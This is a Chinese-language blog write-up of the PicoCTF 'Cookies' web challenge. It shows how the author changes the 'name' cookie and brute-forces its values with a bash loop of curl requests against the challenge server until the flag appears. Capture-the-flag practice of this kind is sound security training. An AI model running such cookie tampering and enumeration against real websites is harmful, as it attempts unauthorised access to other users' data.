---
title: PicoCTF - Cookies
published: 2024-05-14
tags: [PicoCTF]
category: Write Up
draft: false
password: Cookies
abstract: 喜歡有巧克力豆的餅乾
message: 就跟你講吧 ! 密碼是 Cookies
---

# PicoCTF - Cookies
## 題目:
![image](https://hackmd.io/_uploads/SyWLEKT66.png)
>  誰不愛Cookies? 找出最好的那一個餅乾


---

1. 進入頁面後看到
![image](https://hackmd.io/_uploads/HknnHYaT6.png)
直接輸入 "snickerdoodle" 觀察 Cookies 數值變化

2. 觀察到 Cookies 的數值從 -1 變為 0
![image](https://hackmd.io/_uploads/H19qwtTTT.png)

3. 改成 1 後 /check 底下重新整理後變為 Chocolate Clip cookies
![image](https://hackmd.io/_uploads/HJxWdY66p.png)

### 解題
這題目唯一的變數就是 name 的值 , 而增加值會跑出不同總類的餅乾 , 題目說要找出最好的餅乾 , 所以這邊我使用 Brute force 來看能不能取得其他資料

:::info
#### 使用工具 Curl
參數
1. -H 添加 HTTP 請求的 HEAD
2. -s 不輸出錯誤和進度訊息
3. -L 讓 Curl 隨著伺服器重定向
4. 向目標發出 HEAD 請求 , 並且把 HEAD打印出來
:::

使用 Bash 寫個簡單的腳本來自動過濾結果

```=bash
for i in {1..20}; 
do

con=$(curl -s http://mercury.picoctf.net:29649/ -H "Cookie: name=$i; Path=/" -L)

if ! echo "$con" | grep -q "Not very special"; then
#grep -q 用來找尋是否出現該字串 , 找到的話為 True , 由於有這段話代表說尚未找尋到有用的資料 , 所以 if !會反轉輸出結果為 False 以便執行 then後面的語句  
echo "Cookie $i is special"

echo $con | grep "pico"

break

fi

done

```
最後輸出得到結果為
![image](https://hackmd.io/_uploads/BJGlpY6ap.png)



---
### 所需知識
1. 編輯自動化腳本 如Bash,Python etc...
2. 網站請求相關知識 如:HEAD,POST,重定向 etc...
3. Linux指令熟悉 如 grep
4. ~~通靈~~

